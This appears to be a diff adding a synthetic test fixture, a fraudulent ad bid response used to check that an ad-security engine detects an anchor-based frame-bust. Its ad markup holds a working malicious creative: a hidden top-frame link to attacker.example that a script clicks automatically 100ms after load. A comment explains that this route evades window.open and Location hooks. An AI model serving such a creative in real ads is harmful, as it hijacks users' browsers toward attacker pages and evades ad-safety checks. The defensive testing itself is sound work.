@@ -1,0 +1,25 @@
+{
+  "_note": "Synthetic fraud BidResponse — anchor-based frame-bust. The adm renders a visible banner AND a hidden <a target=\"_top\" href=\"...\"> element which is .click()-ed programmatically 100ms after load (no user gesture). Probe hook 11 (capture-phase document click + closest anchor[target]) catches the navigation intent; engine emits behavior.malicious.frame_bust_anchor (ERROR — no gesture lineage). HTML-only frame-bust bypasses our window.open / Location.* hooks entirely because the browser routes target=_top anchors through the top-frame nav code path directly.",
+  "id": "bid-response-frame-bust-anchor-001",
+  "cur": "USD",
+  "seatbid": [
+    {
+      "seat": "synthetic-bad-actor",
+      "bid": [
+        {
+          "id": "bid-frame-bust-anchor-001",
+          "impid": "1",
+          "price": 1.5,
+          "adid": "creative-frame-bust-anchor-001",
+          "adomain": ["bad-actor.example"],
+          "cid": "campaign-frame-bust-001",
+          "crid": "creative-frame-bust-anchor-001",
+          "w": 300,
+          "h": 250,
+          "cat": ["IAB1"],
+          "adm": "<!DOCTYPE html><html><head><meta charset=\"utf-8\"><title>banner</title><style>html,body{margin:0;padding:0;height:100%;font-family:sans-serif}.banner{width:300px;height:250px;background:linear-gradient(135deg,#3e63dd,#7c8cff);color:#fff;display:flex;align-items:center;justify-content:center;font-size:18px;font-weight:600;text-align:center}.bust{display:none}</style></head><body><div class=\"banner\">Limited time deal<br>Tap anywhere</div><a id=\"bust\" class=\"bust\" target=\"_top\" href=\"https://attacker.example/landing\">go</a><script>setTimeout(function(){document.getElementById('bust').click();},100);</script></body></html>"
+        }
+      ]
+    }
+  ]
+}
